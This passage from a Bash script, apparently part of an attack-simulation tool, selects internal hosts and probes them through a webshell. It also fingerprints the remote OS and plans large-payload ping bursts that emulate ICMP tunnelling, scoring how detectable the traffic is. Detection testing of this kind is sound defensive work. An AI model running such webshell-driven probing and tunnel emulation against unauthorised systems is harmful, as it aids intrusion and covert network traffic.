        pri=$(icmp_resolve_host_priority "${ip}")
        case "${pri}" in
            1) ssh_n=$((ssh_n + 1)) ;;
            2) http_n=$((http_n + 1)) ;;
            3) dns_n=$((dns_n + 1)) ;;
            *) other_n=$((other_n + 1)) ;;
        esac
    done <<< "${discovery_ips}"
    icmp_tunnel_log_both "ICMP_TUNNEL_CANDIDATES total=$(printf '%s\n' "${discovery_ips}" | awk 'NF' | wc -l | tr -d ' ') ssh=${ssh_n} http_https=${http_n} dns=${dns_n} other=${other_n} files=ssh_hosts,http_targets,https_targets,dns_hosts,reachable_http,reachable_https"
}

probe_icmp_target() {
    local host="$1" probe_source="${2:-discovery}" probe_priority="${3:-4}"
    local cmd="" out="" sent=0 received=0 ws_empty=false
    local failure_class="" probe_result="dead" log_result=""
    [[ -z "${host}" ]] && return 1
    host=$(poc_extract_ipv4 "${host}")
    [[ -z "${host}" ]] && return 1
    if [[ "${DRY_RUN}" == true ]]; then
        ICMP_PROBE_SENT=2
        ICMP_PROBE_RECEIVED=2
        ICMP_PROBE_RESULT="alive"
        ICMP_PROBE_FAILURE_CLASS=""
        icmp_tunnel_log_both "ICMP_TUNNEL_PROBE_COMMAND target=${host} cmd=ping -c 2 -W 1 ${host} (dry-run)"
        icmp_tunnel_log_both "ICMP_TUNNEL_PROBE_RAW_OUTPUT target=${host} output=dry-run"
        log_result=$(icmp_normalize_probe_result "alive")
        icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_PROBE target=${host} source=${probe_source} priority=${probe_priority} sent=2 received=2 result=${log_result}"
        return 0
    fi
    cmd=$(build_icmp_probe_ping_command "${host}")
    out=$(run_webshell_quick "icmp-probe-${host}" "${cmd} 2>&1; echo __PING_EXIT:\$?" 2>/dev/null || true)
    out=$(strip_stdout_capture_noise "${out}")
    out=$(printf '%s' "${out}" | grep -v '__PING_EXIT:' || true)
    [[ -z "${out}" ]] && ws_empty=true
    log_icmp_probe_diagnostics "${host}" "${cmd}" "${out}"
    read -r sent received <<< "$(parse_icmp_ping_transmit_receive "${out}")"
    failure_class=$(classify_icmp_probe_failure "${sent}" "${received}" "${out}" "${ws_empty}")
    case "${failure_class}" in
        alive) probe_result="alive" ;;
        target_unresponsive) probe_result="target_unresponsive" ;;
        parser_failed) probe_result="parser_failed" ;;
        *) probe_result="${failure_class}" ;;
    esac
    log_result=$(icmp_normalize_probe_result "${probe_result}")
    ICMP_PROBE_SENT="${sent}"
    ICMP_PROBE_RECEIVED="${received}"
    ICMP_PROBE_RESULT="${probe_result}"
    ICMP_PROBE_FAILURE_CLASS="${failure_class}"
    icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_PROBE target=${host} source=${probe_source} priority=${probe_priority} sent=${sent} received=${received} result=${log_result}"
    [[ "${log_result}" == alive ]]
}

icmp_host_allowed_for_probe() {
    local host="$1"
    local user_ip=""
    [[ "${host}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    if ip_in_target_net "${host}"; then
        return 0
    fi
    if [[ -n "${ICMP_TUNNEL_USER_TARGET}" ]]; then
        user_ip=$(poc_extract_ipv4 "${ICMP_TUNNEL_USER_TARGET}")
        [[ "${host}" == "${user_ip}" ]] && return 0
    fi
    return 1
}

icmp_is_valid_ipv4_target() {
    local t="${1:-}"
    icmp_is_internal_target_name "${t}" && return 1
    [[ -z "${t}" || "${t}" == n/a ]] && return 1
    [[ "${t}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]
}

icmp_record_alive_candidate() {
    local -n _alive_map="$1"
    local -n _prio_map="$2"
    local -n _src_map="$3"
    local host="$4" priority="$5" source="$6"
    local cur_prio=99
    [[ -z "${host}" ]] && return 0
    host=$(poc_extract_ipv4 "${host}")
    icmp_is_valid_ipv4_target "${host}" || return 0
    cur_prio=$(safe_int "${_prio_map[${host}]:-99}")
    if (( priority < cur_prio )); then
        _prio_map["${host}"]="${priority}"
        _src_map["${host}"]="${source}"
    fi
    _alive_map["${host}"]=1
}

icmp_pick_best_alive_target() {
    local -n _alive_map="$1"
    local -n _prio_map="$2"
    local -n _src_map="$3"
    local host="" best_host="" best_prio=99 pri=99 ip=""
    for host in "${!_alive_map[@]}"; do
        ip=$(poc_extract_ipv4 "${host}")
        icmp_is_valid_ipv4_target "${ip}" || continue
        pri=$(safe_int "${_prio_map[${host}]:-99}")
        if (( pri < best_prio )); then
            best_prio="${pri}"
            best_host="${ip}"
        fi
    done
    if icmp_is_valid_ipv4_target "${best_host}"; then
        ICMP_TARGET_SELECTION_PRIORITY="${best_prio}"
        ICMP_TARGET_SELECTION_SOURCE="${_src_map[${best_host}]:-discovery}"
        printf '%s' "${best_host}"
        return 0
    fi
    return 1
}

discover_icmp_responsive_hosts() {
    local discovery_ips="" responsive=""
    declare -A alive_map=() alive_prio=() alive_src=()
    discovery_ips=$(collect_icmp_tunnel_discovery_ips)
    icmp_log_discovery_candidate_summary "${discovery_ips}"
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        if [[ "${DRY_RUN}" == true ]]; then
            responsive=$(printf '%s\n%s' "${responsive}" "${host}")
            continue
        fi
        probe_icmp_target "${host}" "$(icmp_resolve_host_source_label "${host}")" "$(icmp_resolve_host_priority "${host}")" && \
            icmp_record_alive_candidate alive_map alive_prio alive_src "${host}" "$(icmp_resolve_host_priority "${host}")" "$(icmp_resolve_host_source_label "${host}")"
    done <<< "${discovery_ips}"
    if [[ "${DRY_RUN}" == true ]]; then
        printf '%s\n' "${responsive}" | awk 'NF' | sort -u
        return 0
    fi
    for host in "${!alive_map[@]}"; do
        responsive=$(printf '%s\n%s' "${responsive}" "${host}")
        icmp_tunnel_log_both "ICMP responsive host discovered: ${host} priority=${alive_prio[${host}]} source=${alive_src[${host}]}"
    done
    printf '%s\n' "${responsive}" | awk 'NF' | sort -u
}

select_icmp_tunnel_target() {
    local discovery_ips="" sweep_ips="" sample_ips="" host target="" source="" detail="" user_ip=""
    local probed_phase="" only_sample_probed=false logic_error=false discovery_files_have_ips=false
    declare -A alive_map=() alive_prio=() alive_src=()
    ICMP_DISCOVERY_CANDIDATE_COUNT=0
    ICMP_DISCOVERY_PROBED_COUNT=0
    ICMP_SUBNET_SWEEP_PROBED_COUNT=0
    ICMP_SAMPLE_FALLBACK_PROBED_COUNT=0
    ICMP_TARGET_PROBE_SENT=0
    ICMP_TARGET_PROBE_RECEIVED=0
    dedupe_discovery_local_cache 2>/dev/null || true
    if [[ -n "${ICMP_TUNNEL_USER_TARGET}" ]]; then
        user_ip=$(poc_extract_ipv4 "${ICMP_TUNNEL_USER_TARGET}")
        if [[ -n "${user_ip}" ]]; then
            probe_icmp_target "${user_ip}" "user" "0"
            ICMP_TARGET_PROBE_SENT="${ICMP_PROBE_SENT}"
            ICMP_TARGET_PROBE_RECEIVED="${ICMP_PROBE_RECEIVED}"
            if [[ "${ICMP_PROBE_RESULT}" == alive ]] || [[ "${ICMP_TUNNEL_FORCE_TARGET}" == true ]]; then
                target="${user_ip}"
                source="user"
                ICMP_TARGET_SELECTION_PRIORITY=0
                if [[ "${ICMP_PROBE_RESULT}" == alive ]]; then
                    detail="operator --icmp-target probe=alive"
                    ICMP_TARGET_REACHABLE=true
                else
                    detail="operator --icmp-target force_run probe=$(icmp_normalize_probe_result "${ICMP_PROBE_RESULT}")"
                    ICMP_TARGET_REACHABLE=false
                    icmp_tunnel_log_both "ICMP user target probe did not confirm alive; continuing because force_run=${ICMP_TUNNEL_FORCE_TARGET}"
                fi
                ICMP_SELECTED_TARGET="${target}"
                icmp_lock_selected_target "${target}" || true
                ICMP_TARGET_SELECTION_SOURCE="${source}"
                ICMP_TARGET_SELECTION_DETAIL="${detail}"
                icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_SELECTED target=${target} source=${source} priority=0 sent=${ICMP_TARGET_PROBE_SENT} received=${ICMP_TARGET_PROBE_RECEIVED} reason=${detail}"
                log_message "OK" "ICMP tunnel target selected: ${target} (source=${source}: ${detail})" >&2
                printf '%s' "${target}"
                return 0
            fi
            icmp_tunnel_log_both "ICMP user target ${user_ip} probe failed: result=$(icmp_normalize_probe_result "${ICMP_PROBE_RESULT}") (see RAW_OUTPUT above)"
        fi
    fi
    if icmp_discovery_files_have_ips; then
        discovery_files_have_ips=true
    fi
    discovery_ips=$(collect_icmp_tunnel_discovery_ips)
    ICMP_DISCOVERY_CANDIDATE_COUNT=$(printf '%s\n' "${discovery_ips}" | awk 'NF' | wc -l | tr -d ' ')
    icmp_tunnel_log_both "ICMP_TUNNEL_PROBE_QUEUE count=${ICMP_DISCOVERY_CANDIDATE_COUNT} hosts=$(printf '%s' "${discovery_ips}" | tr '\n' ',' | sed 's/,$//')"
    icmp_log_discovery_candidate_summary "${discovery_ips}"
    if [[ "${discovery_files_have_ips}" == true && ICMP_DISCOVERY_CANDIDATE_COUNT -eq 0 ]]; then
        icmp_tunnel_log_both "ICMP_TARGET_SELECTION_LOGIC_ERROR reason=discovery_files_have_ips_but_collect_empty"
    fi
    if [[ "${DRY_RUN}" == true ]]; then
        host=$(printf '%s\n' "${discovery_ips}" | awk 'NF' | head -n1)
        [[ -z "${host}" ]] && host="${NETWORK_PREFIX}.10"
        target="${host}"
        source="$(icmp_resolve_host_source_label "${host}")"
        ICMP_TARGET_SELECTION_PRIORITY=$(icmp_resolve_host_priority "${host}")
        detail="dry-run first discovery candidate"
        ICMP_SELECTED_TARGET="${target}"
        icmp_lock_selected_target "${target}" || true
        ICMP_TARGET_SELECTION_SOURCE="${source}"
        ICMP_TARGET_SELECTION_DETAIL="${detail}"
        icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_SELECTED target=${target} source=${source} priority=${ICMP_TARGET_SELECTION_PRIORITY} sent=2 received=2 reason=${detail}"
        log_message "OK" "ICMP tunnel target selected: ${target} (dry-run)" >&2
        printf '%s' "${target}"
        return 0
    fi
    if (( ICMP_DISCOVERY_CANDIDATE_COUNT > 0 )); then
        icmp_tunnel_log_both "ICMP discovery probe phase: candidates=${ICMP_DISCOVERY_CANDIDATE_COUNT} (all discovery hosts before subnet fallback)"
        while IFS= read -r host; do
            [[ -z "${host}" ]] && continue
            [[ -n "${user_ip}" && "${host}" == "${user_ip}" ]] && continue
            probe_icmp_target "${host}" "$(icmp_resolve_host_source_label "${host}")" "$(icmp_resolve_host_priority "${host}")" || true
            ICMP_DISCOVERY_PROBED_COUNT=$((ICMP_DISCOVERY_PROBED_COUNT + 1))
            if [[ "${ICMP_PROBE_RESULT}" == alive ]]; then
                icmp_record_alive_candidate alive_map alive_prio alive_src "${host}" \
                    "$(icmp_resolve_host_priority "${host}")" "$(icmp_resolve_host_source_label "${host}")"
            fi
        done <<< "${discovery_ips}"
        probed_phase="discovery"
    fi
    if [[ ${#alive_map[@]} -eq 0 ]]; then
        sweep_ips=$(collect_icmp_subnet_sweep_ips)
        if [[ -n "${sweep_ips}" ]]; then
            icmp_tunnel_log_both "ICMP subnet sweep probe phase: candidates=$(printf '%s\n' "${sweep_ips}" | awk 'NF' | wc -l | tr -d ' ') files=ping_responsive_hosts,alive_hosts,icmp_hosts"
            while IFS= read -r host; do
                [[ -z "${host}" ]] && continue
                [[ -n "${user_ip}" && "${host}" == "${user_ip}" ]] && continue
                printf '%s\n' "${discovery_ips}" | grep -Fx "${host}" >/dev/null && continue
                probe_icmp_target "${host}" "subnet_sweep" "5" || true
                ICMP_SUBNET_SWEEP_PROBED_COUNT=$((ICMP_SUBNET_SWEEP_PROBED_COUNT + 1))
                if [[ "${ICMP_PROBE_RESULT}" == alive ]]; then
                    icmp_record_alive_candidate alive_map alive_prio alive_src "${host}" "5" "subnet_sweep"
                fi
            done <<< "${sweep_ips}"
            probed_phase="${probed_phase:+$probed_phase,}subnet_sweep"
        fi
    fi
    if [[ ${#alive_map[@]} -eq 0 && ICMP_DISCOVERY_CANDIDATE_COUNT -eq 0 ]]; then
        sample_ips=$(icmp_subnet_sample_hosts)
        icmp_tunnel_log_both "ICMP subnet sample fallback: probing TARGET_SUBNET=${TARGET_NET} samples (no discovery candidates)"
        while IFS= read -r host; do
            [[ -z "${host}" ]] && continue
            [[ -n "${user_ip}" && "${host}" == "${user_ip}" ]] && continue
            icmp_host_allowed_for_probe "${host}" || continue
            probe_icmp_target "${host}" "subnet_sample" "6" || true
            ICMP_SAMPLE_FALLBACK_PROBED_COUNT=$((ICMP_SAMPLE_FALLBACK_PROBED_COUNT + 1))
            if [[ "${ICMP_PROBE_RESULT}" == alive ]]; then
                icmp_record_alive_candidate alive_map alive_prio alive_src "${host}" "6" "subnet_sample"
            fi
        done <<< "${sample_ips}"
        probed_phase="${probed_phase:+$probed_phase,}subnet_sample"
        if (( ICMP_DISCOVERY_CANDIDATE_COUNT > 0 && ICMP_DISCOVERY_PROBED_COUNT == 0 )); then
            only_sample_probed=true
            logic_error=true
        fi
    fi
    if [[ "${discovery_files_have_ips}" == true && ICMP_DISCOVERY_PROBED_COUNT == 0 && ICMP_SAMPLE_FALLBACK_PROBED_COUNT > 0 ]]; then
        logic_error=true
        only_sample_probed=true
    fi
    if (( ICMP_DISCOVERY_CANDIDATE_COUNT > 0 && ICMP_DISCOVERY_PROBED_COUNT == 0 && ICMP_SAMPLE_FALLBACK_PROBED_COUNT > 0 )); then
        logic_error=true
        only_sample_probed=true
    fi
    if [[ "${logic_error}" == true ]]; then
        icmp_tunnel_log_both "ICMP_TARGET_SELECTION_LOGIC_ERROR reason=discovery_candidates_exist_but_not_probed discovery_candidates=${ICMP_DISCOVERY_CANDIDATE_COUNT} discovery_probed=${ICMP_DISCOVERY_PROBED_COUNT} sample_probed=${ICMP_SAMPLE_FALLBACK_PROBED_COUNT}"
    fi
    target=""
    if target=$(icmp_pick_best_alive_target alive_map alive_prio alive_src); then
        target=$(poc_extract_ipv4 "${target}")
        if ! icmp_is_valid_ipv4_target "${target}"; then
            icmp_tunnel_log_both "ICMP_TARGET_SELECTION_LOGIC_ERROR reason=invalid_selected_target value=${target:-empty}"
            target=""
        fi
    fi
    if icmp_is_valid_ipv4_target "${target}"; then
        source="${ICMP_TARGET_SELECTION_SOURCE}"
        probe_icmp_target "${target}" "${source}" "${ICMP_TARGET_SELECTION_PRIORITY}"
        ICMP_TARGET_PROBE_SENT="${ICMP_PROBE_SENT}"
        ICMP_TARGET_PROBE_RECEIVED="${ICMP_PROBE_RECEIVED}"
        detail="ICMP echo probe confirmed alive priority=${ICMP_TARGET_SELECTION_PRIORITY} phases=${probed_phase}"
        ICMP_SELECTED_TARGET="${target}"
        icmp_lock_selected_target "${target}" || true
        ICMP_TARGET_SELECTION_DETAIL="${detail}"
        ICMP_TARGET_REACHABLE=true
        icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_SELECTED target=${target} source=${source} priority=${ICMP_TARGET_SELECTION_PRIORITY} sent=${ICMP_TARGET_PROBE_SENT} received=${ICMP_TARGET_PROBE_RECEIVED} reason=${detail}"
        log_message "OK" "ICMP tunnel target selected: ${target} (source=${source} priority=${ICMP_TARGET_SELECTION_PRIORITY})" >&2
        printf '%s' "${target}"
        return 0
    fi
    ICMP_SELECTED_TARGET=""
    ICMP_TARGET_SELECTION_SOURCE=""
    ICMP_TARGET_SELECTION_DETAIL=""
    if [[ "${only_sample_probed}" == true && (( ICMP_DISCOVERY_CANDIDATE_COUNT > 0 )) ]]; then
        ICMP_SKIP_REASON="no ICMP responsive host found (logic error: discovery candidates not probed)"
    else
        ICMP_SKIP_REASON="no ICMP responsive host found (discovery=${ICMP_DISCOVERY_CANDIDATE_COUNT} probed=${ICMP_DISCOVERY_PROBED_COUNT} sweep=${ICMP_SUBNET_SWEEP_PROBED_COUNT} sample=${ICMP_SAMPLE_FALLBACK_PROBED_COUNT})"
    fi
    ICMP_TARGET_REACHABLE=false
    ICMP_PROBE_RESULT="${ICMP_PROBE_RESULT:-probe_failed}"
    icmp_tunnel_log_both "ICMP_TUNNEL_TARGET_SELECTED target=n/a source= priority= sent=0 received=0 reason=probe_failed"
    icmp_tunnel_log_both "target_selection FAILED: ${ICMP_SKIP_REASON}"
    return 1
}

detect_webshell_remote_os() {
    local out os_raw=""
    if [[ "${DRY_RUN}" == true ]]; then
        ICMP_REMOTE_OS="linux"
        ICMP_PING_STYLE="unix"
        return 0
    fi
    out=$(run_webshell_quick "icmp-os-detect" \
        "uname -s 2>/dev/null || true; cmd /c ver 2>/dev/null | head -n1 || true" 2>/dev/null || true)
    out=$(printf '%s' "${out}" | tr -d '\r')
    os_raw=$(printf '%s\n' "${out}" | head -n1)
    if [[ "${out}" == *[Ww]indows* ]] || [[ "${out}" == *MSFT* ]] || [[ "${out}" == *Microsoft* ]]; then
        ICMP_REMOTE_OS="windows"
        ICMP_PING_STYLE="windows"
    elif [[ "${out}" == *Darwin* ]]; then
        ICMP_REMOTE_OS="macos"
        ICMP_PING_STYLE="unix"
    else
        ICMP_REMOTE_OS="linux"
        ICMP_PING_STYLE="unix"
    fi
    icmp_tunnel_log_both "webshell_remote_os=${ICMP_REMOTE_OS} ping_style=${ICMP_PING_STYLE} uname_sample=${os_raw:-unknown}"
    log_message "OK" "ICMP webshell OS: ${ICMP_REMOTE_OS} (ping_style=${ICMP_PING_STYLE})"
}

build_icmp_ping_command() {
    local count="$1" payload="$2" interval="$3" target="$4" style="${5:-${ICMP_PING_STYLE:-unix}}"
    local cmd interval_f
    count=$(safe_int "${count}")
    payload=$(safe_int "${payload}")
    (( count < 1 )) && count=1
    if [[ "${style}" == windows ]]; then
        cmd="ping -n ${count} -l ${payload} ${target}"
    else
        if (( count <= 5 && payload <= 128 )) || [[ -z "${interval}" || "${interval}" == "0" || "${interval}" == "0.0" ]]; then
            cmd="ping -c ${count} -s ${payload} ${target}"
        else
            interval_f=$(awk -v i="${interval:-${ICMP_BURST_DEFAULT_INTERVAL}}" -v min="${ICMP_TUNNEL_MIN_INTERVAL}" \
                'BEGIN{v=i+0; if(v<min) v=min; if(v>5) v=5; printf "%.2f", v}')
            if awk -v i="${interval_f}" 'BEGIN{exit (i+0 >= 0.2 ? 0 : 1)}'; then
                cmd="ping -c ${count} -s ${payload} -i ${interval_f} ${target}"
            else
                cmd="ping -c ${count} -s ${payload} ${target}"
            fi
        fi
    fi
    printf '%s' "${cmd}"
}

icmp_effective_burst_interval() {
    local interval="${1:-${ICMP_BURST_DEFAULT_INTERVAL}}"
    awk -v i="${interval}" -v min="${ICMP_TUNNEL_MIN_INTERVAL}" \
        'BEGIN{v=i+0; if(v<min) v=min; if(v>5) v=5; printf "%.2f", v}'
}

icmp_plan_burst_parameters() {
    local payload="${1:-1400}" count="" interval="" expected=0 effective_interval=""
    local fb1_count="${ICMP_BURST_FALLBACK_COUNT}" fb1_interval="${ICMP_BURST_FALLBACK_INTERVAL}" fb2_count="${ICMP_BURST_FALLBACK_COUNT}"
    count=$(resolve_icmp_detection_window_plan "${ICMP_PACKET_COUNT}")
    count=$(safe_int "${count}")
    interval="${ICMP_MULTI_BURST_INTERVAL}"
    effective_interval=$(icmp_effective_burst_interval "${interval}")
    expected=75
    ICMP_PACKETS_PLANNED=116
    ICMP_TUNNEL_PROFILE_PACKETS=110
    ICMP_TUNNEL_PROFILE_INTERVAL="${effective_interval}"
    ICMP_PACKET_COUNT="${count}"
    printf '%s %s %s %s %s %s' "110" "${effective_interval}" "${expected}" "${fb1_count}" "${fb1_interval}" "${fb2_count}"
}

icmp_forbid_monolithic_ping_cmd() {
    local cmd="$1" payload="$2" count="$3"
    count=$(safe_int "${count}")
    payload=$(safe_int "${payload}")
    if (( count >= 100 && payload >= "${ICMP_LARGE_PAYLOAD_THRESHOLD}" )); then
        icmp_tunnel_log_both "ICMP_MONOLITHIC_BURST_FORBIDDEN payload=${payload} count=${count} cmd=${cmd}"
        return 1
    fi
    if [[ "${cmd}" == *"-s 1400"* && "${cmd}" == *"-c 200"* ]]; then
        icmp_tunnel_log_both "ICMP_MONOLITHIC_BURST_FORBIDDEN cmd=${cmd}"
        return 1
    fi
    return 0
}

icmp_interval_ms_to_seconds() {
    local interval="$1" sec=""
    interval=$(safe_int "${interval}")
    if (( interval >= 200 )); then
        sec=$(awk -v ms="${interval}" 'BEGIN{printf "%.3f", ms/1000}')
    else
        sec=$(awk -v i="${interval}" -v min="${ICMP_TUNNEL_MIN_INTERVAL:-0.2}" \
            'BEGIN{v=i+0; if(v<min) v=min; if(v>5) v=5; printf "%.2f", v}')
    fi
    printf '%s' "${sec}"
}

icmp_burst_webshell_timeout_seconds() {
    local count="$1" interval="$2"
    local interval_sec="" expected=0 max_cap="${WEBSHELL_LONG_TIMEOUT:-300}"
    count=$(safe_int "${count}")
    interval_sec=$(icmp_interval_ms_to_seconds "${interval}")
    expected=$(awk -v c="${count}" -v i="${interval_sec}" \
        'BEGIN{v=c*i+30; if(v<60) v=60; printf "%.0f", v}')
    (( expected > max_cap )) && expected="${max_cap}"
    printf '%s' "${expected}"
}

icmp_force_burst_webshell_method() {
    local payload="$1"
    local payload_bytes=${#payload} limit=4000 prev_method="${WEBSHELL_METHOD:-GET}"
    ICMP_LAST_PAYLOAD_BYTES="${payload_bytes}"
    if (( payload_bytes > limit )); then
        if [[ "${WEBSHELL_METHOD:-GET}" != POST ]]; then
            icmp_tunnel_log_both "ICMP_TRANSPORT_SWITCH reason=payload_limit from=${prev_method} to=POST payload_bytes=${payload_bytes}"
        fi
        WEBSHELL_METHOD=POST
        printf '%s' POST
        return 0
    fi
    printf '%s' "${WEBSHELL_METHOD:-GET}"
}

icmp_configure_webshell_transport() {
    local context="$1" payload="$2"
    local payload_bytes=${#payload} limit=4000 switched=no prev_method="${WEBSHELL_METHOD:-GET}" effective_method=""
    effective_method=$(icmp_force_burst_webshell_method "${payload}")
    [[ "${effective_method}" == POST && "${prev_method}" == GET ]] && switched=yes
    ICMP_LAST_WEBSHELL_METHOD="${effective_method}"
    icmp_tunnel_log_both "ICMP_PAYLOAD_TRANSPORT context=${context} payload_bytes=${payload_bytes} webshell_method=${effective_method} limit=${limit} switched_get_to_post=${switched}"
    if (( payload_bytes > limit )) && [[ "${effective_method}" != POST ]]; then
        ICMP_LAST_ROOT_CAUSE="payload_transport_limit"
        icmp_tunnel_log_both "ROOT_CAUSE=payload_transport_limit module=ICMP detail=payload_bytes=${payload_bytes} limit=${limit}"
    fi
    printf '%s' "${effective_method}"
}

icmp_log_burst_transport() {
    local target="$1" burst_index="$2" payload_bytes="$3" planned_packets="$4" timeout_sec="$5" webshell_method="${6:-${ICMP_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}}"
    timeout_sec=$(safe_int "${timeout_sec}")
    (( timeout_sec < 60 )) && timeout_sec=60
    ICMP_LAST_EFFECTIVE_TIMEOUT_SEC="${timeout_sec}"
    ICMP_LAST_CURL_MAX_TIME="${timeout_sec}"
    icmp_tunnel_log_both "ICMP_BURST_TRANSPORT target=${target} burst_index=${burst_index} payload_bytes=${payload_bytes} webshell_method=${webshell_method} effective_timeout_sec=${timeout_sec} curl_max_time=${timeout_sec} planned_packets=${planned_packets}"
}

icmp_log_burst_result_summary() {
    local burst_index="$1" attempted="$2" actual="$3" received="$4" loss="$5" duration="$6" exit_code="$7" root_cause="${8:-ok}"
    icmp_tunnel_log_both "ICMP_BURST_RESULT burst_index=${burst_index} attempted_packets=${attempted} actual_packets=${actual} received_packets=${received} loss=${loss} duration=${duration} exit_code=${exit_code} ROOT_CAUSE=${root_cause}"
    [[ "${root_cause}" != ok ]] && icmp_tunnel_log_both "ROOT_CAUSE=${root_cause} module=ICMP burst_index=${burst_index}"
}

icmp_emit_burst_aggregation() {
    icmp_tunnel_log_both "ICMP_BURST_AGGREGATION successful_bursts=${ICMP_SUCCESSFUL_BURSTS:-0} failed_bursts=${ICMP_FAILED_BURSTS:-0} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} actual_packets=${ICMP_PACKETS_ATTEMPTED:-0} received_packets=${ICMP_REPLIES_RECEIVED:-0}"
}

icmp_compute_detection_readiness() {
    local actual="$1" received="$2" score="$3"
    actual=$(safe_int "${actual}")
    received=$(safe_int "${received}")
    score=$(safe_int "${score}")
    if (( actual >= 80 && received >= 40 && score >= 70 )); then
        ICMP_DETECTION_READINESS="HIGH"
    elif (( actual >= 30 )); then
        ICMP_DETECTION_READINESS="MEDIUM"
    else
        ICMP_DETECTION_READINESS="LOW"
    fi
}

icmp_tunnel_session_success_met() {
    icmp_tunnel_window_condition_met "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" \
        "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${ICMP_DETECTION_LIKELIHOOD:-LOW}"
}

icmp_payload_anomaly_success_met() {
    local large="${ICMP_LARGE_PACKETS:-0}" sent="${ICMP_PACKETS_ATTEMPTED:-0}" received="${ICMP_REPLIES_RECEIVED:-0}"
    large=$(safe_int "${large}")
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    (( sent >= 80 && received >= 40 && large >= 80 )) \
        || (( sent >= 30 && received >= 15 && large >= 50 )) \
        || { (( large >= 80 )) && [[ "${ICMP_DETECTION_LIKELIHOOD:-LOW}" =~ ^(HIGH|MEDIUM)$ ]]; }
}

icmp_resolve_payload_anomaly_result() {
    local sent="$1" received="$2"
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    local large=$(safe_int "${ICMP_LARGE_PACKETS:-0}") ratio=$(safe_int "${ICMP_LARGE_PAYLOAD_RATIO:-0}")
    ICMP_TUNNEL_FINAL_RESULT="failed"
    ICMP_TUNNEL_RESULT="failed"
    ICMP_TUNNEL_STAGE_RESULT="failed"
    if (( sent == 0 || received == 0 )); then
        return 1
    fi
    compute_icmp_detection_likelihood "${sent}" "${ICMP_PAYLOAD_SIZE_AVG:-0}" "${ICMP_TUNNEL_DURATION_ELAPSED:-0}"
    icmp_compute_detection_readiness "${sent}" "${received}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
    if (( large >= 80 && sent >= 80 && received >= 40 && ratio >= 70 )); then
        ICMP_DETECTION_LIKELIHOOD="HIGH"
        ICMP_DETECTION_READINESS="HIGH"
        ICMP_TUNNEL_RESULT="success"
        ICMP_TUNNEL_STAGE_RESULT="success"
        ICMP_TUNNEL_FINAL_RESULT="success"
        ICMP_DETECTION_REASON="payload_size_anomaly_fallback large_packets=${large} actual=${sent} received=${received} ratio=${ratio}%"
        return 0
    fi
    if (( sent >= 30 && received >= 15 && large >= 50 )); then
        ICMP_DETECTION_LIKELIHOOD="MEDIUM"
        ICMP_DETECTION_READINESS="MEDIUM"
        ICMP_TUNNEL_RESULT="success"
        ICMP_TUNNEL_STAGE_RESULT="success"
        ICMP_TUNNEL_FINAL_RESULT="success"
        ICMP_DETECTION_REASON="payload_size_anomaly_fallback large_packets=${large} actual=${sent} received=${received} ratio=${ratio}%"
        return 0
    fi
    if (( sent >= 30 )); then
        ICMP_DETECTION_LIKELIHOOD="MEDIUM"
        ICMP_DETECTION_READINESS="MEDIUM"
        ICMP_TUNNEL_RESULT="partial"
        ICMP_TUNNEL_STAGE_RESULT="partial"
        ICMP_TUNNEL_FINAL_RESULT="partial"
        ICMP_DETECTION_REASON="payload_size_anomaly_partial large_packets=${large} actual=${sent} received=${received}"
        return 0
    fi
    ICMP_TUNNEL_RESULT="partial"
    ICMP_TUNNEL_STAGE_RESULT="partial"
    ICMP_TUNNEL_FINAL_RESULT="partial"
    return 0
}

icmp_emit_mode_summary() {
    local tag="$1" mode="$2"
    icmp_compute_detection_readiness "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
    icmp_tunnel_log_both "${tag} mode=${mode} planned_packets=${ICMP_PACKETS_PLANNED:-0} actual_packets=${ICMP_PACKETS_ATTEMPTED:-0} received_packets=${ICMP_REPLIES_RECEIVED:-0} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE:-0} bidirectional_ratio=${ICMP_BIDIRECTIONAL_RATIO:-0}% detection_likelihood=${ICMP_DETECTION_LIKELIHOOD:-LOW} detection_readiness=${ICMP_DETECTION_READINESS} result=${ICMP_TUNNEL_FINAL_RESULT:-partial} root_cause=${ICMP_LAST_ROOT_CAUSE:-none}"
}

extract_icmp_burst_echo_text() {
    local out="$1" capturing=no chunk=""
    out=$(printf '%s' "${out}" | tr -d '\r')
    while IFS= read -r line || [[ -n "${line}" ]]; do
        if [[ "${line}" == *"ICMP_TUNNEL_BURST_ECHO_BEGIN"* || "${line}" == *"ICMP_TUNNEL_BURST_ECHO begin"* ]]; then
            capturing=yes
            chunk=""
            continue
        fi
        if [[ "${line}" == *"ICMP_TUNNEL_BURST_ECHO_END"* || "${line}" == *"ICMP_TUNNEL_BURST_ECHO end"* ]]; then
            capturing=no
            printf '%s\n' "${chunk}"
            return 0
        fi
        if [[ "${capturing}" == yes ]]; then
            chunk="${chunk}${line}"$'\n'
        fi
    done <<< "${out}"
    printf '%s' ""
}

icmp_burst_output_contaminated() {
    local out="$1" burst_id="$2"
    local n=0 prev=0 cur=0 line=""
    while IFS= read -r line; do
        [[ "${line}" == ICMP_TUNNEL_BURST_RESULT* ]] || continue
        cur=$(safe_int "$(sed -n 's/.*\<parsed_sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        (( cur == 0 )) && cur=$(safe_int "$(sed -n 's/.*\<sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        (( n == 0 )) && { prev="${cur}"; n=1; continue; }
        if (( prev > 0 && cur > prev && cur - prev >= 5 )); then
            printf '%s' "output_parse_contaminated"
            return 0
        fi
        prev="${cur}"
        n=$((n + 1))
